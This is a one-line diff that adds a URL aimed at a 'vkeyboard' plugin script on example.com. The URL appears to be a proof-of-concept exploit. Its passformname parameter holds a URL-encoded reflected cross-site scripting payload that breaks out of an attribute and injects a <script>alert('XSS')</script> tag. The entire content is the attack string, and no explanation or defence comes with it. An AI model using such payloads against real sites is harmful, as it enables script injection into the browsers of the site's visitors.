@@ -1,0 +1,1 @@
+http://www.example.com/plugins/vkeyboard/vkeyboard.php?passformname=%22%3E%3Cscript%3Ealert%28%27XSS%27%29;%3C/script%3E%3Cscript%3E/*%20
